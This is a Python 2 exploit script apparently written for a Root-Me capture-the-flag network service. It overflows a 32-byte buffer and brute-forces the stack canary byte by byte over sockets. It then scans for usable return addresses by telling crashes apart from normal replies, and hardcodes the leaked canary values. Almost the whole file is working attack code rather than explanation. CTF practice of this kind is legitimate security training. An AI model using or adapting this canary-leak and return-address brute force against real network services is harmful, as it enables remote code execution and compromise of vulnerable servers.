import re
import time
import struct
import socket
import binascii


HOST = 'challenge03.root-me.org'
PORT = 56543
LEN = 1024


def test(input, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        s.recv(LEN)
        s.send(input)
        t = 'a'
        while len(t)>0:
            t = s.recv(LEN)
            u = t.split('\n')
            for i in u:
                if re.search('Bye',i):
                    s.close()
                    return 0
        s.close()
        return 1
    except Exception,e:
        if re.search('Connection reset by peer',str(e)):
            return 2
        elif re.search('timed out',str(e)):
            return 3
        else:
            print("Exception : "+str(e))
            print("[-] Unknown exception, exiting")
            exit()
    except:
        print("[-] Unknown exception, exiting")
        exit()

def test_send_more(input, timeout=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        print(s.recv(LEN))
        s.send(input)
        s.send(input)
        s.send(input)
        s.send(input)
        s.send(input)
        t = 'a'
        nbBye = 0
        while len(t)>0:
            t = s.recv(LEN)
            print(t)
            u = t.split('\n')
            for i in u:
                if re.search('Bye',i):
                    nbBye += 1
        print("Number Bye : "+str(nbBye))
        if nbBye<1:
            return 1
        elif nbBye == 1:
            return 0
        else:
            return 4
    except Exception,e:
        print("Exception : "+str(e))
        if re.search('Connection reset by peer',str(e)):
            return 2
        elif re.search('timed out',str(e)):
            return 3
        else:
            print("[-] Unknown exception, exiting")
            exit()
    except:
        print("[-] Unknown exception, exiting")
        exit()


#1] Find length
print("[+] Finding vulnerable length")

# garbage_len = -1
# for i in range(1,100):
#     if test('A'*i)==1 and garbage_len<0:
#         garbage_len = i-1
garbage_len = 32

print("[.] Length found : "+str(garbage_len))


print("[+] Finding cookie and leak")

def leak_from_position(begin, end, prefix = '', stop_at_first_found = False):
    leaked = {}
    cookie = ''
    if prefix == '':
        prefix = 'A'*begin
    for j in range(begin, end):
        found = False
        leaked[j] = []
        i = 0
        while (not found or not stop_at_first_found) and i<256:
            #print(binascii.hexlify(prefix+cookie+chr(i)))
            a = test(prefix+cookie+chr(i))
            if a == 0:
                found = True
                leaked[j].append(chr(i))
            elif a == 3:
                a = test(prefix+cookie+chr(i))
                if a == 3:
                    print("time for "+str(i))
                elif a == 0:
                    found = True
                    leaked[j].append(chr(i))
            if not found or not stop_at_first_found:
                i += 1
                time.sleep(0.1)

        if len(leaked[j]) == 0:
            print("[!] Ouch no dump has been made ...")
            cookie += '?'
        else:
            print("[.] Found part of cookie with "+str(len(leaked[j]))+" choices")
            if len(leaked[j])<10:
                print(j)
                print(leaked[j])
            if not stop_at_first_found:
                if leaked[j][0] == '\x00' and len(leaked[j])>1:
                    if leaked[j][1] == '\n' and len(leaked[j])>2:
                        cookie += leaked[j][2]
                    elif leaked[j][1] == '\n':
                        cookie += '\x00'
                    else:
                        cookie += leaked[j][1]
                elif leaked[j][0] == '\n' and len(leaked[j])>1:
                    cookie += leaked[j][1]
                else:
                    cookie += leaked[j][0]
            else:
                cookie += chr(i)

        print("cur cookie = "+cookie)
        print(binascii.hexlify(cookie))

    return cookie, leaked

cookie, leaked = leak_from_position(garbage_len,garbage_len+100)
for a in leaked:
    if len(leaked[a])<10:
        print(a)
        print(leaked[a])

#prev : 00fe37930101010264efc1ec1806a6fc85cec1ec
cookie_hex = '00ee04e801010101648f99de4c2008f78d6e99de'
cookie_hex = '00ee04e801010101649f99de4c2008f78d6e99de'
cookie = binascii.unhexlify(cookie_hex)[:-4]
print("[.] Cookie leaked : "+cookie_hex)

print("[+] Finding all possible return addresses")

addresses_crash = [[] for _ in range(3)]
addresses_block = [[] for _ in range(3)]
for k in range(len(addresses_block)):
    print("==========================")
    print("===== "+str(k)+" =====")
    for j in range(0x20,0xc0):
        for i in range(0,256,4):
            cookie = cookie[:-4]+chr(i)+chr(j)+cookie[-2:]
            tmp = test('A'*garbage_len+cookie)
            if tmp != 1:
                if tmp != 0:
                    if tmp == test('A'*garbage_len+cookie):
                        addr = binascii.hexlify(cookie[-4:][::-1])
                        addresses_block[k].append(addr)
                        print(addr)
                else:
                    addr = binascii.hexlify(cookie[-4:][::-1])
                    addresses_crash[k].append(addr)
                    print(addr)

print("addresses block")
print(addresses_block)
print("addresses crash")
print(addresses_crash)

final_addrs_block = []

for j in range(len(addresses_block[0])):
    add = True
    for k in range(1,len(addresses_block)):
        if addresses_block[0][j] not in addresses_block[k]:
            add = False
    if add:
        final_addrs_block.append(addresses_block[0][j])


final_addrs_crash = []

for j in range(len(addresses_crash[0])):
    add = True
    for k in range(1,len(addresses_crash)):
        if addresses_crash[0][j] not in addresses_crash[k]:
            add = False
    if add:
        final_addrs_crash.append(addresses_crash[0][j])

print("Final addresses block :")
print(final_addrs_block)
print("Final addresses crash :")
print(final_addrs_crash)


cookie_hex = '00ee04e801010101648f99de4c2008f78d3c6e99de'
cookie = binascii.unhexlify(cookie_hex)
print("[.] Cookie leaked : "+cookie_hex)

print("[+] Finding all possible return addresses with one more change")

addresses_crash = [[] for _ in range(3)]
addresses_block = [[] for _ in range(3)]
for k in range(len(addresses_block)):
    print("==========================")
    print("===== "+str(k)+" =====")
    for j in range(0x20,0xc0):
        for i in range(0,256,4):
            cookie = cookie[:-8]+chr(i)+chr(j)+cookie[-6:]
            tmp = test('A'*garbage_len+cookie)
            if tmp != 1:
                if tmp != 0:
                    if tmp == test('A'*garbage_len+cookie):
                        addr = binascii.hexlify(cookie[-8:-4][::-1])
                        addresses_block[k].append(addr)
                        print(addr)
                else:
                    addr = binascii.hexlify(cookie[-8:-4][::-1])
                    addresses_crash[k].append(addr)
                    print(addr)

print("addresses block")
print(addresses_block)
print("addresses crash")
print(addresses_crash)

final_addrs_block = []

for j in range(len(addresses_block[0])):
    add = True
    for k in range(1,len(addresses_block)):
        if addresses_block[0][j] not in addresses_block[k]:
            add = False
    if add:
        final_addrs_block.append(addresses_block[0][j])


final_addrs_crash = []

for j in range(len(addresses_crash[0])):
    add = True
    for k in range(1,len(addresses_crash)):
        if addresses_crash[0][j] not in addresses_crash[k]:
            add = False
    if add:
        final_addrs_crash.append(addresses_crash[0][j])

print("Final addresses block :")
print(final_addrs_block)
print("Final addresses crash :")
print(final_addrs_crash)




cookie_hex = '00ee04e801010101648f99de4c2008f78daaaaaaaa'
cookie = binascii.unhexlify(cookie_hex)
print("[.] Cookie leaked : "+cookie_hex)

print("[+] Finding all possible return addresses with big garbage change")

addresses_crash = [[] for _ in range(3)]
addresses_block = [[] for _ in range(3)]
for k in range(len(addresses_block)):
    print("==========================")
    print("===== "+str(k)+" =====")
    for j in range(0x20,0xc0):
        for i in range(0,256,4):
            cookie = cookie[:-8]+chr(i)+chr(j)+cookie[-6:]
            tmp = test('A'*garbage_len+cookie)
            if tmp != 1:
                if tmp != 0:
                    if tmp == test('A'*garbage_len+cookie):
                        addr = binascii.hexlify(cookie[-8:-4][::-1])
                        addresses_block[k].append(addr)
                        print(addr)
                else:
                    addr = binascii.hexlify(cookie[-8:-4][::-1])
                    addresses_crash[k].append(addr)
                    print(addr)

print("addresses block")
print(addresses_block)
print("addresses crash")
print(addresses_crash)

final_addrs_block = []

for j in range(len(addresses_block[0])):
    add = True
    for k in range(1,len(addresses_block)):
        if addresses_block[0][j] not in addresses_block[k]:
            add = False
    if add:
        final_addrs_block.append(addresses_block[0][j])


final_addrs_crash = []

for j in range(len(addresses_crash[0])):
    add = True
    for k in range(1,len(addresses_crash)):
        if addresses_crash[0][j] not in addresses_crash[k]:
            add = False
    if add:
        final_addrs_crash.append(addresses_crash[0][j])

print("Final addresses block :")
print(final_addrs_block)
print("Final addresses crash :")
print(final_addrs_crash)

exit()


# cookie, leaked = leak_from_position(garbage_len+len(cookie),garbage_len+len(cookie)+100,'A'*garbage_len+cookie)
# for a in leaked:
#     if len(leaked[a])<10:
#         print(a)
#         print(leaked[a])

for i in range(60,63):
    print("============")
    t = test_send_more('A'*garbage_len+cookie[:-4]+chr(i))
    print(i,t)
    #if t == 3:
    #    print(i)
    #    print(test_send_more('A'*garbage_len+cookie+chr(i)))
exit()
